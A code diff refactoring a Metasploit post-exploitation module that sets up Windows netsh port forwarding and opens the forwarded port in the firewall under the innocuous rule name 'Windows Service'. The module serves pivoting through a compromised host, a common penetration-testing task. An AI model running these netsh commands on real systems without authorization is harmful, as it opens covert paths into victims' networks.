@@ -41,19 +41,12 @@ class Metasploit3 < Msf::Post
 			return
 		end
 
-		type = datastore['TYPE']
-		lport = datastore['LPORT']
-		cport = datastore['CPORT']
-		ipv6_xp = datastore['IPV6_XP']
-		laddress = datastore['LADDRESS']
-		caddress = datastore['CADDRESS']
-
-		return unless enable_portproxy(lport,cport,laddress,caddress,type,ipv6_xp)
-		fw_enable_ports(lport)
+		return unless enable_portproxy
+		fw_enable_ports
 
 	end
 
-	def enable_portproxy(lport,cport,laddress,caddress,type,ipv6_xp)
+	def enable_portproxy
 		rtable = Rex::Ui::Text::Table.new(
 			'Header' => 'Port Forwarding Table',
 			'Indent' =>  3,
@@ -63,11 +56,17 @@ class Metasploit3 < Msf::Post
 		# Due to a bug in Windows XP you need to install IPv6
 		# http://support.microsoft.com/kb/555744/en-us
 		if sysinfo["OS"] =~ /XP/
-			return false if not check_ipv6(ipv6_xp)
+			return false if not check_ipv6
 		end
 
 		print_status("Setting PortProxy ...")
-		output = cmd_exec("netsh","interface portproxy add #{type} listenport=#{lport} listenaddress=#{laddress} connectport=#{cport} connectaddress=#{caddress}")
+		netsh_args = "interface portproxy "
+		netsh_args << "add #{datastore['TYPE']} "
+		netsh_args << "listenport=#{datastore['LPORT']} "
+		netsh_args << "listenaddress=#{datastore['LADDRESS']} "
+		netsh_args << "connectport=#{datastore['CPORT']} "
+		netsh_args << "connectaddress=#{datastore['CADDRESS']}"
+		output = cmd_exec("netsh", netsh_args)
 		if output.size > 2
 			print_error("Setup error. Verify parameters and syntax.")
 			return false
@@ -92,12 +91,12 @@ class Metasploit3 < Msf::Post
 		end
 	end
 
-	def check_ipv6(ipv6_xp)
+	def check_ipv6
 		if ipv6_installed()
 			print_status("IPv6 is already installed.")
 			return true
 		else
-			if not ipv6_xp
+			if not datastore['IPV6_XP']
 				print_error("IPv6 is not installed. You need IPv6 to use portproxy.")
 				return false
 			else
@@ -113,17 +112,17 @@ class Metasploit3 < Msf::Post
 		end
 	end
 
-	def fw_enable_ports(port)
-		print_status ("Setting port #{port} in Windows Firewall ...")
+	def fw_enable_ports
+		print_status ("Setting port #{datastore['LPORT']} in Windows Firewall ...")
 		begin
 			if sysinfo["OS"] =~ /Windows 7|Vista|2008|2012/
-				cmd_exec("netsh","advfirewall firewall add rule name=\"Windows Service\" dir=in protocol=TCP action=allow localport=\"#{port}\"")
+				cmd_exec("netsh","advfirewall firewall add rule name=\"Windows Service\" dir=in protocol=TCP action=allow localport=\"#{datastore['LPORT']}\"")
 			else
-				cmd_exec("netsh","firewall set portopening protocol=TCP port=\"#{port}\"")
+				cmd_exec("netsh","firewall set portopening protocol=TCP port=\"#{datastore['LPORT']}\"")
 			end
 			output = cmd_exec("netsh","firewall show state")
 
-			if  output =~ /^#{port} /
+			if  output =~ /^#{datastore['LPORT']} /
 				print_good("Port opened in Windows Firewall.")
 			else
 				print_error("There was an error enabling the port.")
